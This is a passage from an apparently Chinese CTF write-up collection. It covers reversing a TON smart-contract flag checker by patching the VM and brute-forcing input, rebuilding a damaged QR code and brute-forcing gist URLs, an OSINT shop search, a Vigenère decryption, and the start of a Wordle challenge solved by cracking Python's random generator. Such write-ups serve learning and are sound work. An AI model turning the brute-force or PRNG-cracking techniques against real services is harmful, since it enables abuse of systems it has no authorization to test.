\u5728\u7f51\u7ad9\u4e0a\u6ca1\u6709\u5177\u4f53\u53cd\u6c47\u7f16\u7684\u95ee\u9898\u3002</p> <p>\u63a5\u4e0b\u6765\u77e5\u9053\u4e86\u8fd0\u884c\u65f6\u6302\u5728\u4e86\u5f00\u5934\uff0c\u56e0\u4e3a\u5f00\u5934\u8bfb\u53d6\u7684 data[1:5] \u4f5c\u4e3a timestamp \u548c\u5f53\u524d\u7684\u65f6\u95f4\u6bd4\u8f83\uff0c\u5982\u679c\u5728 data \u8bbe\u5b9a\u7684\u4ee5\u524d\u5c31 throw 6 \u5f02\u5e38\uff0c\u6240\u4ee5\u5e72\u8106\u5728\u4ee3\u7801\u91cc\u628a LESS(B9) \u6539\u4e3a GEQ(BE) \u5c31\u53ef\u4ee5\u4e86\u3002\u63a5\u4e0b\u6765\u540e\u9762\u7684\u90e8\u5206\u5c31\u53ef\u4ee5\u6b63\u5e38\u6267\u884c\u4e86\uff0c\u6839\u636e\u6bcf\u6761\u6307\u4ee4\u6765\u6a21\u62df\u6808\uff0c\u5f97\u5230\u4ee5\u4e0b\u7684\u6808\u53d8\u5316\u5206\u6790\uff1a</p> internal \u6808\u53d8\u5316\u5206\u6790 <pre><code>msg_raw message data\nmsg_raw message data[8:]\nmsg_raw message data[8:40] data[40:]\nmsg_raw data[40:] data[8:40] message\nmsg_raw data[40:] data[8:40] message 32\nmsg_raw data[40:] data[8:40] message[32:] now\nmsg_raw data[40:] message[32:] now data[8:40]\nmsg_raw data[40:] message[32:] -1\nmsg_raw data[40:] message[32:]\nmsg_raw data[40:] message[32:] message[32:]\nmsg_raw data[40:] message[32:] 344\nmsg_raw data[40:] message[32:] 344 344\nmsg_raw data[40:] message[32:] 0\nmsg_raw data[40:] message[32:] null\nmsg_raw data[40:] message[32:] null 1\nmsg_raw data[40:] message[32:] null 1 cont1\n    msg_raw data[40:] message[:32] null\n    msg_raw data[40:] message[:32]\n    msg_raw message[32:] data[40:]\n    msg_raw message[32:] D data[40+dict:]\n    msg_raw data[40+dict:] message[32:] D\nD data[40+dict:] message[32:] msg_raw\nD data[40+dict:] message[32:] msg_raw 4\nD data[40+dict:] message[32:] msg_raw[4:]\nD data[40+dict:] message[32:] msg_raw.src msg_raw[src:]\nD data[40+dict:] message[32:] msg_raw.src\nD data[40+dict:] msg_raw.src message[32:]\nD data[40+dict:] msg_raw.src message[32:32+48] message[32+48:]\nD data[40+dict:] msg_raw.src message[32+48:] message[32:32+48]\nD data[40+dict:] msg_raw.src message[32+48:] message[32:32+48] 92703703713403\nD data[40+dict:] msg_raw.src message[32+48:]\nD data[40+dict:] msg_raw.src message[32+48:] ()\nD data[40+dict:] msg_raw.src message[32+48:] () 11000385076366155543686602566826962197403024283852028545596640486225\nD data[40+dict:] msg_raw.src message[32+48:] ()\nD data[40+dict:] msg_raw.src message[32+48:] () 36\nD data[40+dict:] msg_raw.src message[32+48:] () 36 refcont\n    D data[40+dict:] msg_raw.src message[32+48:] ()\n    D data[40+dict:] msg_raw.src () message[32+48:]\n    D data[40+dict:] msg_raw.src () message[32+48:32+56] message[32+56:]\n    D data[40+dict:] msg_raw.src () message[32+48:32+56] message[32+56:] 233\n    D data[40+dict:] msg_raw.src () message[32+56:] 233 message[32+48:32+56]\n    D data[40+dict:] msg_raw.src () message[32+56:] 233*message[32+48:32+56]\n    D data[40+dict:] msg_raw.src () message[32+56:] 233*message[32+48:32+56] 256\n    D data[40+dict:] msg_raw.src () message[32+56:] 233*message[32+48:32+56] rand(256)\n    D data[40+dict:] msg_raw.src () message[32+56:] 233*message[32+48:32+56]+rand(256)\n    D data[40+dict:] msg_raw.src () message[32+56:] 233*message[32+48:32+56]+rand(256) 255\n    D data[40+dict:] msg_raw.src () message[32+56:] (233*message[32+48:32+56]+rand(256))&amp;(255)\n    D data[40+dict:] msg_raw.src () message[32+56:] (233*message[32+48:32+56]+rand(256))&amp;(255) rand(256)\n    D data[40+dict:] msg_raw.src () message[32+56:] ((233*message[32+48:32+56]+rand(256))&amp;255)^rand(256)\n    D data[40+dict:] msg_raw.src () message[32+56:] ((233*message[32+48:32+56]+rand(256))&amp;255)^rand(256) D\n    D data[40+dict:] msg_raw.src () message[32+56:] ((233*message[32+48:32+56]+rand(256))&amp;255)^rand(256) D 8\n    D data[40+dict:] msg_raw.src () message[32+56:] D[((233*message[32+48:32+56]+rand(256))&amp;255)^rand(256)] ?\n    D data[40+dict:] msg_raw.src () message[32+56:] D[((233*message[32+48:32+56]+rand(256))&amp;255)^rand(256)][:8] D[((233*message[32+48:32+56]+rand(256))&amp;255)^rand(256)][8:]\n    D data[40+dict:] msg_raw.src () message[32+56:] D[((233*message[32+48:32+56]+rand(256))&amp;255)^rand(256)][:8]\n    D data[40+dict:] msg_raw.src message[32+56:] () D[((233*message[32+48:32+56]+rand(256))&amp;255)^rand(256)][:8]\n    D data[40+dict:] msg_raw.src message[32+56:] (D[((233*message[32+48:32+56]+rand(256))&amp;255)^rand(256)][:8])\n... exec refcont for 36 times ...\n\nD data[40+dict:] msg_raw.src message[...:] flag_content\nflag_content data[40+dict:] msg_raw.src message[...:]\n...\nflag_content data[40+dict:] msg_raw.src 35\nflag_content data[40+dict:] msg_raw.src 35 35\nflag_content data[40+dict:] msg_raw.src 35 35 refcont\n    flag_content data[40+dict:] msg_raw.src 35\n    flag_content data[40+dict:] msg_raw.src 35 35\n    flag_content data[40+dict:] msg_raw.src 35 36\n    flag_content data[40+dict:] msg_raw.src 35 rand(36)\n    flag_content data[40+dict:] msg_raw.src 35 rand(36) flag_content 35\n    flag_content data[40+dict:] msg_raw.src 35 rand(36) flag_content[35]\n    flag_content data[40+dict:] msg_raw.src 35 rand(36) flag_content[35] (flag_content) rand(36)\n    flag_content data[40+dict:] msg_raw.src 35 rand(36) flag_content[35] flag_content[rand(36)]\n    flag_content[35] data[40+dict:] msg_raw.src 35 rand(36) flag_content flag_content[rand(36)] 35\n    flag_content[35] data[40+dict:] msg_raw.src 35 rand(36) flag_content{35=flag_content[rand(36)]}\n    35 data[40+dict:] msg_raw.src flag_content{35=flag_content[rand(36)]} flag_content[35] rand(36)\n    35 data[40+dict:] msg_raw.src flag_content{35=flag_content[rand(36)], rand(36)=flag_content[35]}\n    flag_content{35=flag_content[rand(36)], rand(36)=flag_content[35]} data[40+dict:] msg_raw.src 35\n    flag_content{35=flag_content[rand(36)], rand(36)=flag_content[35]} data[40+dict:] msg_raw.src 34\n\n    flag_content_modified data[40+dict:] msg_raw.src 34\n    flag_content_modified data[40+dict:] msg_raw.src 34 34\n    flag_content_modified data[40+dict:] msg_raw.src 34 35\n    flag_content_modified data[40+dict:] msg_raw.src 34 rand(35)\n    flag_content_modified data[40+dict:] msg_raw.src 34 rand(35) flag_content_modified 34\n    ...\n\n    flag_content_modified data[40+dict:] msg_raw.src 0\nflag_content_modified data[40+dict:] msg_raw.src\nflag_content_modified data[40+dict:] msg_raw.src 0\nflag_content_modified data[40+dict:] msg_raw.src 0 36\nflag_content_modified data[40+dict:] msg_raw.src 0 36 refcont\n    flag_content_modified data[40+dict:] msg_raw.src 0\n    flag_content_modified data[40+dict:] msg_raw.src 0 flag_content_modified 0\n    flag_content_modified data[40+dict:] msg_raw.src 0 flag_content_modified[0]\n    flag_content_modified flag_content_modified[0] msg_raw.src 0 data[40+dict:]\n    flag_content_modified flag_content_modified[0] msg_raw.src 0 data[40+dict:48+dict] data[48+dict:]\n    flag_content_modified data[48+dict:] msg_raw.src 0 flag_content_modified[0] data[40+dict:48+dict]\n    flag_content_modified[0]==data[40+dict:48+dict]?\n</code></pre> <p>\u8fd9\u6837\u770b\u6574\u4f53\u7684\u903b\u8f91\u5c31\u662f\uff1a</p> <pre><code>input = input[4:]\nif input[:6] != \"TPCTF{\":\n    throw 6\nflag = []\nsetrand(11000385076366155543686602566826962197403024283852028545596640486225)\nfor i in range(36):\n    flag.append(D[((233*input[i]+rand(256))&amp;255)^rand(256)][0])\nfor i in range(35, 0, -1):\n    a = rand(i + 1)\n    flag[i], flag[a] = flag[a], flag[i]\nfor i in range(36):\n    if flag[i] != data_after_dict[i]:\n        throw 666\n</code></pre> <p>\u4e3a\u4e86\u62ff\u5230\u5176\u4e2d\u7684\u6570\u636e\u9700\u8981\u8ba9 executor \u5728\u8fd0\u884c\u4e2d\u8f93\u51fa\u6808\u7684\u5185\u5bb9\uff0c\u901a\u8fc7\u9605\u8bfb\u4ee3\u7801\u77e5\u9053 ton-contract-executor \u6700\u7ec8\u8c03\u7528\u4e86 ton \u5b98\u65b9 vm-exec \u5206\u652f\u91cc\u7f16\u8bd1\u597d\u7684 wasm \u6765\u8dd1\u6307\u4ee4\uff0c\u540c\u65f6\u4e5f\u7ed9\u4e86 builder  ton-community/ton-vm-exec-builder\uff08\u8fd9\u4e2a builder \u7684 README \u6709\u95ee\u9898\uff0cclone ton \u6e90\u7801\u7684\u65f6\u5019\u9700\u8981\u52a0 --recursive\uff09\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5 patch ton \u7684\u6e90\u7801\u91cd\u65b0\u7f16\u8bd1\u751f\u6210 wasm \u8f7d\u5165 executor \u4e86\u3002\u5728 ton-blockchain/crypto/vm/vm.cpp \u4e2d VmState::step() \u5f00\u5934\u7684\u5730\u65b9\u52a0\u5165\u6808\u7684\u8f93\u51fa\u4ee3\u7801\uff1a</p> <pre><code>std::ostringstream os;\nstack-&gt;dump(os, 3);\nVM_LOG(this) &lt;&lt; \"stack:\" &lt;&lt; std::move(os).str();\n</code></pre> <p>\u8fd9\u6837\u5c31\u53ef\u4ee5\u62ff\u5230\u5176\u4e2d\u51fa\u73b0\u7684\u6240\u6709\u503c\u4e86\uff0c\u4e0d\u8fc7\u6700\u540e\u7684\u5224\u65ad\u53ea\u8981\u6709\u4e0d\u4e00\u6837\u7684\u5c31\u4f1a\u629b\u51fa 666 \u7ed3\u675f\u6267\u884c\u800c\u4e0d\u663e\u793a\u540e\u9762\u7684 data_after_dict \u503c\uff0c\u6240\u4ee5\u4e3a\u4e86 dump \u51fa\u8fd9\u90e8\u5206\u8fd8\u9700\u8981 patch \u4e00\u4e0b contops.cpp \u91cc exec_throw_fixed\uff0c\u4f7f\u5f97 excno \u4e3a 666 \u65f6 return 0\u3002\u4e4b\u540e\u5f97\u5230\u6240\u6709\u6808\u8f93\u51fa\uff0c\u6839\u636e\u6b63\u5219 <code>(\\d+?) (\\d+?) CS</code> \u53ef\u4ee5\u7b5b\u9009\u5f97\u5230 data_after_dict \u7684\u5185\u5bb9\uff0c\u6839\u636e\u6b63\u5219 <code>execute RAND.*?(\\d+?) (\\d+?) \\]</code> \u53ef\u4ee5\u7b5b\u9009\u5f97\u5230\u6bcf\u6b21\u4ea4\u6362\u7684 i \u548c a\uff0c\u7136\u540e\u53cd\u8fc7\u6765\u4ea4\u6362\u56de\u53bb\u5f97\u5230\u7b2c\u4e00\u4e2a\u5faa\u73af\u540e\u7684 flag\uff1a</p> <pre><code>[46, 254, 159, 162, 180, 48, 104, 193, 90, 2, 82, 236, 188, 10, 224, 196, 138, 170, 62, 151, 172, 27, 4, 209, 58, 16, 27, 88, 32, 46, 161, 174, 86, 193, 135, 101]\n</code></pre> <p>\u7b2c\u4e00\u4e2a\u5faa\u73af\u91cc\u7684\u8fd0\u7b97\u6bd4\u8f83\u590d\u6742\u800c\u4e14\u6709\u622a\u65ad\uff0c\u8fd8\u6709 D \u5b57\u5178\u7684\u7ed3\u6784\u4e5f\u4e0d\u592a\u4e86\u89e3\u3002\u56e0\u4e3a\u6bcf\u4e00\u4f4d\u7684\u8ba1\u7b97\u548c\u5176\u4ed6\u4f4d\u90fd\u6ca1\u6709\u5173\u7cfb\uff0c\u6240\u4ee5\u9009\u62e9\u4ece\u524d\u5f80\u540e\u7684\u65b9\u6cd5\uff0c\u9010\u4f4d\u7206\u7834 flag\uff1a</p> \u7206\u7834\u811a\u672c <p><pre><code>import os\nimport re\nfrom tqdm import trange\n\ntarget = [46, 254, 159, 162, 180, 48, 104, 193, 90, 2, 82, 236, 188, 10, 224, 196, 138, 170, 62, 151, 172, 27, 4, 209, 58, 16, 27, 88, 32, 46, 161, 174, 86, 193, 135, 101]\ntemplate = \"4141414154504354467b%s7d\"\n\nflag = [0x41] * 36\nfor i in range(36):\n    for j in trange(32, 127):\n        flag[i] = j\n        # logs = os.popen(\"node debug.mjs %02x\" % j).read() # 65536 \u957f\u5ea6\u9650\u5236\n        os.system(\"node debug.mjs %s &gt; tmp\" % (template % bytes(flag).hex()))\n        with open('tmp', 'r') as f:\n            logs = f.read()\n        res = re.findall(r\"..376; refs: 0..0\\} (\\d+?) CS\\{Cell\\{000\", logs)\n        if int(res[i]) == target[i]:\n            print(bytes(flag))\n            break\n</code></pre> <pre><code>import { SmartContract, internal, externalIn } from \"ton-contract-executor\";\nimport { Cell, BitString } from \"@ton/core\";\n\nasync function main() {\n    let contract = await SmartContract.fromCell(\n        Cell.fromBoc(Buffer.from(\"te6cckECCAEAATgAART/APSkE/S88sgLAQIBIAIDBPjSbCLtRNDTBzHTHwKAINch+CNYufJGINdJgQFYuvKGbSLHALOVMAH0BFneA9B01yH6QDAB0y8BgiBUUENURnu68oZvAILQaHR0cHM6Ly95b3V0dS5iZS9kUXc0dzlXZ1hjUfgUgCSK5DTTBzDAffKGgCMgiuQwcIAkiuQTBAUGBwBi8jDtRNDTBwHAAPKG+ADTH20hxwCzlDD0BAHeAYEBINcYMHHIywcTyx/0AAHPFsntVABEAdMHgQDpWKiDB/gRoIQHsIMH+BGyJXj0Dm+hMNMHMBJvjAAuIKT4EVNBb4FTUW+BVBYDb4VAVW+FA6UAHFMwb4ED0wdQRLry4pqkAERfA3AggBjIywVQA88WgQKa+gISy2rLH4szY2NozxbJc/sAUXUrEg==\", \"base64\"))[0], // patched\n        Cell.fromBoc(Buffer.from(\"...\", \"hex\"))[0], // not changed\n        {debug: true}\n    );\n    let bf_content = process.argv[2];\n    const msgBody = new Cell({bits: new BitString(Buffer.from(bf_content, \"hex\"), 0, 47 * 8)});\n    const res = await contract.sendInternalMessage(\n        internal({\n            dest: contract.address,\n            value: 0n,\n            bounce: false,\n            body: msgBody,\n        })\n    );\n    console.log(res.logs);\n}\n\nawait main();\nprocess.exit();\n</code></pre></p> <p>\u8fd9\u6837\u7206\u7834\u51fa\u6765\u5c31\u80fd\u5f97\u5230\u4e00\u4e2a uuid \u5c31\u662f flag\u3002</p>"}, {"location": "writeups/tpctf2023/#wait-for-first-blood", "title": "wait for first blood", "text": "<p>\u5f88\u6709\u610f\u601d\u7684\u5f62\u5f0f\uff0c\u4e00\u4e2a\u4e8c\u7ef4\u7801\u9694\u4e00\u6bb5\u65f6\u95f4\u591a\u7ed9\u51fa\u51e0\u4e2a\u70b9\uff0c\u76f4\u5230\u4e00\u8840\u540e\u4e0d\u518d\u589e\u52a0\u3002</p> <p>\u7b2c\u4e8c\u5929\u665a\u4e0a\u624d\u53ef\u505a\uff0c\u5df2\u77e5\u7248\u672c v7\uff0c\u683c\u5f0f\u4fe1\u606f\u53ef\u4ee5\u5b8c\u5168\u7ea0\u9519\uff0c\u7b49\u7ea7 H \u63a9\u7801 0\uff0c\u4e14\u6ce8\u610f v7H \u4e0b data codewords \u548c error correction codewords \u4f1a\u8fdb\u884c\u5206\u7ec4\u91cd\u6392\uff0c\u524d\u56db\u7ec4\u6bcf\u7ec4 13 \u6570\u636e 26 \u7ea0\u9519\uff0c\u6700\u540e\u4e00\u7ec4 14 \u6570\u636e 26 \u7ea0\u9519\uff0c\u89e3\u8bfb\u4e8c\u7ef4\u7801\u6bd4\u7279\u6d41\u518d\u91cd\u6392\u56de\u6765\u5f97\u5230\u6b63\u5e38\u7684\u5e8f\u5217\u4e3a\uff08\u4e0d\u662f\u6700\u65b0\uff09\uff1a</p> <pre><code>?010000?0??0101000101?000000?100?1?010?0?11010?001000?000?001001?000001111?11?0?1101000000100?0010111?011001110110100?01?10?110?11?100001011100??001110?1?100100100000100001?100101?10?010?01000111101?0?1?01000100111011?101?00111000100?11???111011?0110001100011010?0010000001?001?101100010001101100110?1000110010?00?1011?011?0?1000111000001101010011?001?011001100?1011?0110?01?011001100011001100110??0?01?0101?011000101100101?01110000?10?00?001101100??10101?11000??0011000?0?1000?10011?0010011100100110101?0110?0101?00??001100?100\n</code></pre> <p>\u7136\u540e\u6839\u636e\u4e8c\u7ef4\u7801\u7684\u7f16\u7801\u8fdb\u884c\u89e3\u8bfb\uff0c\u5f00\u5934\u662f HttPS://gist.giTHUB.COM/KONANO/ \u53ef\u4ee5\u5b8c\u5168\u786e\u5b9a\uff0c\u540e\u9762 32 \u4e2a\u5b57\u8282\u5728 [0-9a-f] \u95f4\uff0c\u53ef\u4ee5\u57fa\u672c\u7f29\u5c0f\u8303\u56f4\uff1a</p> \u4eba\u5de5\u89e3\u7801 <pre><code>0010\n000000001   - len = 1\n010001      - H\n0100 \n00000010    - len = 2\n01110100    - t\n01110100    - t\n0010\n000000100   - len = 4\n10010000001 - PS\n11111100111 - :/\n0100\n00001000    - len = 8\n00101111    - /\n01100111    - g\n01101001    - i\n01110011    - s\n01110100    - t\n00101110    - .\n01100111    - g\n01101001    - i\n0010\n000010000   - len = 16\n10100101010 - TH\n10101010001 - UB\n11101101110 - .C\n10001001110 - OM\n11110100011 - /K\n10001001111 - ON\n00111011001 - AN\n10001100011 - O/\n0100\n00100000    - len = 32\n01100101    - e\n01100010    - b\n00110110    - 6\n01100100    - d\n0110010?    - d/e\n00110110    - 6\n01100010    - b\n00111000    - 8\n00110101    - 5\n0011?001    - 1/9\n00110011    - 3\n00110111    - 7\n0110001?    - b/c\n01100110    - f\n00110011    - 3\n00110??0    - 0/2/4/6\n00110101    - 5\n00110001    - 1\n01100101    - e\n00111000    - 8\n01100001    - a\n00110110    - 6\n00110101    - 5\n011000??    - a/b/c\n0011000?    - 0/1\n011000?1    - a/c\n0011?001    - 1/9\n00111001    - 9\n00110101    - 5\n00110?01    - 1/5\n01100010    - b\n01100?10    - b/f\n0\n</code></pre> <p>\u7136\u540e\u5168\u6392\u5217\u679a\u4e3e\u672a\u77e5\u6bd4\u7279\uff0c\u5408\u6cd5\u7684 url \u5c31\u8fdb\u884c\u8bbf\u95ee\uff0c\u6b63\u786e\u7684 200 \u4e0d\u6b63\u786e 404\uff0c\u53ef\u4ee5\u7206\u7834\u3002</p> \u7206\u7834\u4ee3\u7801 <pre><code>total = \"\".join(known)\n\nimport itertools\nfrom tqdm import tqdm\nimport requests\n\nfor i in tqdm(itertools.product(\"01\", repeat=unknown_bits), total=2**unknown_bits):\n    flag = \n    cur = total[:]\n    for j in range(unknown_bits):\n        cur = cur.replace('?', i[j], 1)\n    res = \"\".join([chr(int(cur[i:i+8], 2)) for i in range(0, len(cur), 8)])\n    for each in res:\n        if each not in \"0123456789abcdef\":\n            flag = 1\n            break\n    if flag == 1:\n        continue\n    url = \"https://gist.github.com/Konano/\" + res\n    r = requests.get(url)\n    if r.status_code == 200:\n        print(url)\n        print(res)\n        break\n</code></pre> <p>\u7206\u7834\u5f97\u5230 https://gist.github.com/Konano/eb6dd6b85937bf3651e8a65c1a9951bb\uff0c\u8bbf\u95ee\u5f97\u5230 flag: TPCTF{WhEN_nAnO_MEeTS_qrcod3_1n_thE_Mix_OF_jEop@rdy_@nd_k0h(?)}\u3002</p> <p>\u5176\u5b9e\u53ef\u4ee5\u679a\u4e3e\u4e4b\u540e\u6309\u7167 v7 H0 \u91cd\u65b0\u751f\u6210\u4e00\u4e2a\u65b0\u7684\u4e8c\u7ef4\u7801\u518d\u548c\u9898\u76ee\u7684\u6bd4\u8f83\u9a8c\u8bc1\u5c31\u53ef\u4ee5\u4e86\uff0c\u672c\u5730\u7206\u7834\u6548\u7387\u66f4\u9ad8\uff0c\u672c\u5e94\u8be5\u66f4\u65e9\u505a\u51fa\u6765\uff0c\u75db\u5931\u4e09\u8840\u3002</p>"}, {"location": "writeups/tpctf2023/#t", "title": "\u5c0f T \u7684\u65e5\u5e38", "text": "\u9898\u76ee <p>\u672c\u9898 flag \u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u4e3a TPCTF{[A-Z]+:\\d+}\uff0c\u5176\u4e2d [A-Z]+ \u4e3a\u5c0f T \u5bb6\u697c\u4e0b\u5546\u5e97\u8857\u7684\u4e00\u5143\u5e97\u9694\u58c1\u7684\u670d\u88c5\u5e97\u5e97\u540d\uff0c\\d+ \u4e3a\u8fd9\u5bb6\u670d\u88c5\u5e97\u7684\u7535\u8bdd\u53f7\u7801\u3002</p> <p>Google \u641c\u7d22\u56fe\u7247\u53ef\u4ee5\u67e5\u5230\u8fd9\u91cc\u662f\u6a2a\u6ee8\u7684\u6a31\u6728\u753a\u548c\u8f66\u9a6c\u9053\u4e24\u4e2a\u5730\u94c1\u7ad9\u9644\u8fd1\uff0c\u5e94\u8be5\u662f\u4e0a\u73ed\u5730\u70b9\uff0c\u6240\u4ee5\u63a5\u4e0b\u6765\u8981\u6839\u636e\u901a\u52e4\u4fe1\u606f\u627e\u5230\u5c45\u4f4f\u5730\u70b9\u3002</p> <p>\u4e94\u5206\u949f\u8def\u7a0b\u4e00\u4e2a\u6708 8000 \u65e5\u5143\u7684\u8bdd\uff0c\u53ef\u80fd\u662f JR \u53ef\u80fd\u662f\u6a31\u6728\u753a\u5230\u77f3\u5ddd\u753a\uff08150*2*26=7800\uff09\uff0c\u9644\u8fd1\u6709\u5143\u753a\u4e2d\u534e\u8857\uff0c\u91cc\u9762\u641c dollor store \u53ef\u4ee5\u641c\u5230 china square \u7684 daiso \u5e97\uff0c\u4e0d\u8fc7\u9644\u8fd1\u6ca1\u6709\u670d\u88c5\u5e97\uff0c\u627e\u4e86 china square \u5b98\u7f51\uff0c\u662f 2011 \u5e74\u7684\u6570\u636e\u4e86\uff0c\u9694\u58c1\u6ca1\u6709\u670d\u88c5\u5e97\u3002\u8c37\u6b4c\u5730\u56fe\u91cc\u9762\u663e\u793a china square \u91cc\u6709\u4e00\u5bb6\u670d\u88c5\u79df\u8d41\u7684\u767d\u9f99\u9986\uff0c\u4e0d\u5bf9\uff0c\u5e94\u8be5\u5c31\u4e0d\u662f\u8fd9\u91cc\u3002</p> <p>\u5982\u679c\u4e0d\u662f JR \u7684\u8bdd\u6709\u53ef\u80fd\u662f\u8425\u84dd\u7ebf\u6a31\u6728\u753a\u5230\u962a\u4e1c\u6865\uff08200*2*20=8000\uff09\uff0c\u8fd9\u4e2a\u4e00\u5468\u4e0a\u73ed\u4e94\u5929\u770b\u8d77\u6765\u66f4\u7b26\u5408\u6761\u4ef6\uff0c\u800c\u4e14\u6a31\u6728\u753a\u662f JR \u548c\u5e02\u8425\u5171\u7528\u7684\u5730\u94c1\u7ad9\uff0c\u4e0a\u4e0b\u73ed\u7684\u65f6\u5019\u770b JR \u4eba\u591a\u5410\u69fd\u4e00\u4e0b\u5012\u4e5f\u5408\u7406\u3002\u962a\u4e1c\u6865\u7ad9\u9644\u8fd1\u6709\u6a2a\u6ee8\u6865\u901a\u5546\u5e97\u8857\uff0c\u5728\u91cc\u9762\u627e\u6709\u4e00\u5bb6 NARUKIYA\uff0c\u65c1\u8fb9\u662f Can*Do \u767e\u5143\u5e97\uff1a</p> <p></p> <p>\u6240\u4ee5 flag \u4e3a TPCTF{NARUKIYA:2311855}</p> <p>\uff08\u5176\u5b9e\u961f\u53cb\u505a\u7684\u65f6\u5019\u662f\u5f53\u6210\u5143\u753a\u4e2d\u534e\u8857\u7406\u89e3\u7684\uff0c\u7136\u540e\u987a\u7740\u8fd9\u6761\u8def\u4e00\u76f4\u722c\u627e\u767e\u5143\u5e97\u770b\u8857\u666f\uff0c\u6b6a\u6253\u6b63\u7740\u627e\u5230\u4e86 NARUKIYA\uff09</p>"}, {"location": "writeups/tqlctf2022/", "title": "TQLCTF 2022 Writeup", "text": "<p> \u7ea6 1232 \u4e2a\u5b57  365 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p> <p>Abstract</p> <p>\u6e05\u534e\u4e3b\u529e\u7684\u6bd4\u8d5b\uff0cmisc \u57fa\u672c\u90fd\u662f NanoApe \u51fa\u7684\uff0c\u8d28\u91cf\u9ad8\u7684\u5f88</p> <ul> <li>nano \u7684\u5b98\u65b9 writeup</li> </ul>"}, {"location": "writeups/tqlctf2022/#ranma12", "title": "Ranma\u00bd", "text": "<p>\u6253\u5f00 flag \u5341\u516d\u8fdb\u5236\uff0c\u662f\u4e00\u4e2a\u975e\u6807\u51c6\u7684 UTF-8 \u7f16\u7801\uff0c\u4e5f\u5c31\u662f\u90e8\u5206\u53ef\u4ee5\u4e00\u4e2a\u5b57\u8282\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\u7684\uff0c\u5199\u6210\u4e86\u7b26\u5408 UTF-8 \u7f16\u7801\u539f\u7406\u7684\u4e24\u4e2a\u5b57\u8282\uff0c\u5bfc\u81f4\u7f16\u8f91\u5668\u65e0\u6cd5\u6b63\u5e38\u8bfb\u53d6\uff08\u4f46\u662f vim \u80fd\u8bfb\u53d6\uff09</p> <p>\u53ef\u4ee5\u5f97\u5230\u4e00\u4e32\u5bc6\u6587\uff1a</p> <p>KGR/QRI 10646-1 zswtqgg d tnxcs tsdtofbrx osk ndnzhl gna Ietygfviy Idoilfvsu Arz (QQJ) hkkqk maikaglvusv ubyp cw ekg krzyj'o kitwkbj alypsdd.  Wjs rzvmebrwoa duwcuosu pqecgqamo cw ekg IFA, uussmpu, ysum aup qfxschljyk swks pcbb khxnsee drdoqpgpwfyv cbg xeupctzou, oql gneg ylv nsg bb zds upygzrxzkjh fq XVT-8, wpr uxxvnw qt wpvy isdz. XVT-8 kif zds tsdtofbrxegktf qt szryafmtqi hkm sahz LD-DUQLQ egjuv, auqjllvtc qfxschljvrehp hlvv iqyk omjehog, sieyafj lqf cwprx ocwezcfh bugp fvwb qb XA-NYYWZ gdniha oap oip wtoqacgnsee wq cwprx rocfhu. HTTPZB{QFOLP6_KRZ1Q}</p> <p>\u5f88\u5bb9\u6613\u731c\u6d4b\u5f00\u5934\u5e94\u8be5\u662f ISO/IEC 10646-1\uff0c\u800c\u80fd\u5c06 I \u52a0\u5bc6\u4e3a\u4e0d\u540c\u5b57\u7b26\uff0c\u60f3\u5230\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801</p> <p>\u67e5\u5230\u539f\u6587\u662f RFC 3629 \u7684 abstract:</p> <p>ISO/IEC 10646-1 defines a large character set called the Universal Character Set (UCS) which encompasses most of the world's writing systems.  The originally proposed encodings of the UCS, however, were not compatible with many current applications and protocols, and this has led to the development of UTF-8, the object of this memo.  UTF-8 has the characteristic of preserving the full US-ASCII range, providing compatibility with file systems, parsers and other software that rely on US-ASCII values but are transparent to other values.</p> <p>\u53cd\u63a8\u51fa key\uff1a<code>CODINGWORLD</code> \u89e3\u5bc6\u5f97\u5230\u7ed3\u5c3e\u7684 flag\uff1a<code>TQLCTF{CODIN6_WOR1D}</code></p>"}, {"location": "writeups/tqlctf2022/#wordle", "title": "wordle", "text": "<p>wordle \u6e38\u620f\uff0c\u8981\u6c42 512 \u5c40\u5168\u90e8\u731c\u5bf9</p> <p>\u5148\u5199\u4e86\u4e00\u4e2a solver\uff0c\u6539\u5199\u7684  zulkarnine/WordleSolver easy \u548c normal \u96be\u5ea6\u5747\u6ca1\u6709 flag \u76f8\u5173\u4fe1\u606f\uff0c\u6240\u4ee5\u8981\u89e3\u51fa insane \u96be\u5ea6\uff0c\u5373 512 \u5c40\u5168\u90e8\u63a7\u5236\u5728 4 \u6b21\u4ee5\u5185\u731c\u51fa\u6765\uff0c\u4e0d\u73b0\u5b9e\uff0c\u627e\u5176\u5b83\u65b9\u6cd5</p> <p>\u53d1\u73b0\u6bcf\u5c40\u90fd\u4f1a\u5148\u7ed9\u51fa\u4e00\u4e2a hex \u503c\uff0c\u800c\u4e14\u7b97\u6cd5\u5df2\u77e5\uff0c\u5e76\u4e14\u7531\u9898\u76ee\u6587\u4ef6\u4e2d\u6ce8\u91ca <code># To prevent the disclosure of answer</code> \u77e5\u9053\u53cd\u63a8\u7b54\u6848\u4e0d\u73b0\u5b9e \u518d\u8003\u8651\u5230\u6574\u4e2a\u9898\u76ee\u662f\u5728\u4e00\u4e2a while True \u4ee5\u5185\u7684\uff0c\u89e3\u51fa\u4e00\u4e2a\u96be\u5ea6\u540e\u4e0d\u4f1a\u5173\u6389\u9898\u76ee\uff0c\u800c\u662f\u53ef\u4ee5\u7ee7\u7eed\u9009\u62e9\u96be\u5ea6\u7ee7\u7eed\u89e3\u9898</p> <p>\u6240\u4ee5\u5b58\u5728\u7206\u7834 random \u6a21\u5757\u4f2a\u968f\u673a\u6570\u7684\u53ef\u80fd \u56e0\u4e3a hex \u503c\u7b97\u6cd5\u5df2\u77e5\uff1a</p> <pre><code>id = random.randrange(len(valid_words) * (2 ** 20))\nanswer = valid_words[id % len(valid_words)]\nid = (id // len(valid_words)) ^ (id % len(valid_words))\nreturn hex(id)[2:].zfill(5), answer\n</code></pre> <p>\u5982\u679c\u77e5\u9053\u7b54\u6848\u5219\u76f8\u5f53\u4e8e\u77e5\u9053 <code>id % len(valid_words)</code>\uff0c\u518d\u4e0e hex \u503c\u5f02\u6216\u53ef\u4ee5\u5f97\u5230 <code>id // len(valid_words)</code>\uff0c\u800c <code>len(valid_words)</code> \u5df2\u77e5\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u63a8\u5f97 <code>id</code>\uff0c\u5373 randrange \u7684\u7ed3\u679c</p> <p>\u7206\u7834 random \u4f7f\u7528  tna0y/Python-random-module-cracker\uff0c\u9700\u8981 512 \u4e2a 